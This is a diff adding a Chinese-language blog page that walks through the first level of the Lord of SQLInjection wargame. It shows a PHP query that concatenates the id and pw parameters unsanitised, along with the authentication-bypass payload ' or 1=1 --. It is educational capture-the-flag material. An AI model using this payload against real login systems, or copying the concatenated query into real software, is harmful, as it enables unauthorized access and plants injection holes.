@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="zh-Hant">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>los.rubiya - Dougan's Blog</title>
+    <style>
+        /* 沿用原本的顏色變數 */
+        :root {
+            --bg: #f4f7f6; --header-bg: #fff; --text: #333; --card: #fff; --border: #eee; --accent: #3498db; --code-bg: #f8f9fa;
+        }
+        [data-theme="dark"] {
+            --bg: #181a1b; --header-bg: #242627; --text: #e8e6e3; --card: #242627; --border: #3c4143; --accent: #5dade2; --code-bg: #2d2f31;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; transition: background 0.3s, color 0.3s; }
+        body { font-family: "PingFang TC", "Heiti TC", "Microsoft JhengHei", sans-serif; background: var(--bg); color: var(--text); line-height: 1.8; }
+
+        header { background: var(--header-bg); border-bottom: 1px solid var(--border); padding: 1rem 10%; display: flex; justify-content: space-between; align-items: center; position: sticky; top: 0; z-index: 1000; }
+        .logo { font-size: 1.5rem; font-weight: bold; color: var(--accent); text-decoration: none; }
+
+        /* 文章容器 */
+        .article-container { max-width: 800px; margin: 40px auto; padding: 40px; background: var(--card); border-radius: 12px; border: 1px solid var(--border); box-shadow: 0 4px 15px rgba(0,0,0,0.05); }
+        
+        .breadcrumb { font-size: 0.9rem; margin-bottom: 20px; color: var(--accent); }
+        .breadcrumb a { color: var(--accent); text-decoration: none; }
+        
+        h1 { font-size: 2.2rem; margin-bottom: 10px; color: var(--text); }
+        .meta { font-size: 0.85rem; color: #999; margin-bottom: 30px; border-bottom: 1px solid var(--border); padding-bottom: 15px; }
+
+        /* 技術內容樣式 */
+        p { margin-bottom: 20px; }
+        h3 { margin: 25px 0 15px; color: var(--accent); border-left: 4px solid var(--accent); padding-left: 10px; }
+        
+        /* 程式碼區塊 */
+        pre { background: var(--code-bg); padding: 20px; border-radius: 8px; overflow-x: auto; border: 1px solid var(--border); margin: 20px 0; }
+        code { font-family: "Cascadia Code", "Consolas", monospace; font-size: 0.95rem; }
+        .highlight { color: #e74c3c; font-weight: bold; }
+
+        /* 返回按鈕 */
+        .back-btn { display: inline-block; margin-top: 30px; text-decoration: none; color: var(--accent); font-weight: bold; }
+        .back-btn:hover { text-decoration: underline; }
+
+        @media (max-width: 600px) { .article-container { margin: 20px; padding: 20px; } }
+    </style>
+</head>
+<body>
+
+    <header>
+        <a href="index.html" class="logo">Dougan Blog</a>
+    </header>
+
+    <div class="article-container">
+        <div class="breadcrumb"><a href="index.html">首頁</a> / <a href="#">CTF 紀錄</a></div>
+        
+        <h1>Lord of SQLInjection: los.rubiya (Gremlin)</h1>
+        <div class="meta">發佈日期：2025年3月30日 • 作者：Dougan • 分類：#網路安全</div>
+
+        <p>這是 Lord of SQLInjection 的第一關：Gremlin。這關主要測試最基礎的 <code>' OR '1'='1</code> 繞過技巧。</p>
+
+        <h3>原始碼分析</h3>
+        <p>題目會接收 <code>id</code> 與 <code>pw</code> 兩個參數，並直接拼接到 SQL 查詢語句中：</p>
+        
+        <pre><code>$query = "select id from prob_gremlin where id='{$_GET[id]}' and pw='{$_GET[pw]}'";</code></pre>
+
+        <h3>攻擊向量 (Payload)</h3>
+        <p>我們可以使用 <code>' or 1=1 -- </code> 來使查詢條件恆真，從而繞過密碼檢查：</p>
+        
+        <pre><code>?id=admin' or 1=1 -- </code></pre>
+        
+        <p>在這個例子中，SQL 語句會變成：<br>
+        <code class="highlight">SELECT id FROM prob_gremlin WHERE id='admin' or 1=1 -- ' AND pw='...'</code></p>
+
+        <a href="index.html" class="back-btn">← 返回文章列表</a>
+    </div>
+
+</body>
+</html>
